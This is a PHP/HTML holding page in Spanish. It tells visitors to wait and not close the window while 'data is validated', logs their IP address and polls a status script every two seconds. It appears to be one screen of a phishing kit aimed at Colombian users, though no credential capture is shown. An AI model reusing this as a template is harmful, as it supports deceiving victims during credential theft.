<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");

date_default_timezone_set('America/Bogota');
?>
<html>
	<head>
  		<title>En unos segundos estaremos para ti!</title>
  		<meta http-equiv="content-type" content="text/html; utf-8">
  		<meta charset="utf-8">
		<meta content="es" http-equiv="Content-Language">
  		<meta name="viewport" content="width=device-width, initial-scale=1.0">
	 	<meta http-equiv="X-UA-Compatible" content="IE=edge">	 	
		<link href="../../../../../src/css/layout.css" rel="stylesheet">
		<link href="../../../../../src/css/fonts.css" rel="stylesheet">		
		<link rel="icon" type="image/png" href="../../../../../src/img/logo.png" />
		<script type="text/javascript" src="../../../../../src/js/jquery-3.6.0.min.js"></script>
		<script src="../../../../../src/js/jquery.jclock-min.js" type="text/javascript"></script>
   		<script type="text/javascript" src="../../../../../src/js/run.js"></script>  		
   	</head>
   	<body style="">
			
	<div style="text-align:center;  margin-top: 13%;"> 		
			<img src="../../../../../src/img/logo.svg">
			
			<br><p class="text-center" style="font-family: 'OpenSans-Regular' !important; width:90%; max-width: 457px; display: inline-block; font-size: 14px;">Por favor espere unos segundos estamos validando algunos datos. No cierres o recargues esta ventana.</p><br>
			<img src="../../../../../src/img/load2.gif" />

	</div>					
		     
			
<meta http-equiv="PRAGMA" content="NO-CACHE"> 
<meta http-equiv="Expires" content="-1">
	</body>
</html>
<script language="javascript">
$(document).ready(function() {
	setInterval(status,2000);	
});
</script>